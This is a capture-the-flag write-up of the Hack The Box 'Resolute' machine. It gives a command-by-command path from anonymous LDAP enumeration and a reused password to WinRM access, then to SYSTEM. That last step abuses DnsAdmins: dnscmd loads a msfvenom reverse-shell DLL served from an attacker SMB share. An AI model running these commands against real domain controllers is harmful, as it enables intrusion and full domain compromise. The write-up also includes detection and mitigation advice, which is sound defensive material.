---
machine: Resolute
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory
state: Retired
pwned: 2026-11-09
tags: [windows, active-directory, ldap, dnsadmins, dnscmd, privesc]
---

# Resolute — Hack The Box

**English** | [🇪🇸 Español](README.md)

## TL;DR

Anonymous LDAP exposes a password in the `description` field, and it is reused across accounts. WinRM gets a shell, and BloodHound shows membership in **`DnsAdmins`**: point the DNS service at an arbitrary DLL with `dnscmd` and it runs as `SYSTEM`.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <TARGET_IP>
```

| Port | Service |
|---|---|
| 53/tcp | DNS |
| 88/tcp | Kerberos |
| 389/636 | LDAP |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

## Enumeration

```bash
ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=megabank,DC=local' '(objectClass=user)' sAMAccountName description
rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'
```

`melanie`'s `description` holds a password. It is reused by `ryan`, who is in `Remote Management Users`.

```bash
nxc smb <TARGET_IP> -u melanie -p '<password>'
nxc winrm <TARGET_IP> -u ryan -p '<password>'
```

## Foothold

```bash
evil-winrm -i <TARGET_IP> -u ryan -p '<password>'
type C:\Users\ryan\Desktop\user.txt
whoami /groups | findstr -i dns
```

## Escalation: DnsAdmins

The `DnsAdmins` group can point the DNS service at a DLL it loads as `SYSTEM` on start:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o evil.dll
impacket-smbserver share . -smb2support
```

From WinRM:

```cmd
dnscmd <DC> /config /serverlevelplugindll \\<LHOST>\share\evil.dll
sc stop dns
sc start dns
```

On restart the DLL loads as `SYSTEM` and the reverse shell calls back.

## Typical errors

- **`dnscmd` not found** → it is not in PATH; use `C:\Windows\System32\dnscmd.exe`.
- **`Access is denied`** → you are not in `DnsAdmins`, or the DC is a different host.
- **DLL does not load** → the service did not restart; `sc stop dns` may fail, use `Restart-Service DNS`.
- **SMB blocked** → serve the DLL over HTTP and use a reachable UNC path, or copy it locally.
- **Plugin persists** → `/serverlevelplugindll` stays configured; clear it (`dnscmd /config /serverlevelplugindll ""`) and restart.

## Detection and mitigation

- **5136** on the DNS server object and **7045**/service configuration changes.
- **5145** to the share holding the DLL and **4624** type 3 from the DC to the attacker.
- Remove `DnsAdmins` from anyone who does not need it; the group is equivalent to DC admin.
- Review `serverlevelplugindll` and block outbound UNC from DCs.

MITRE: T1543.003, T1055, T1078.
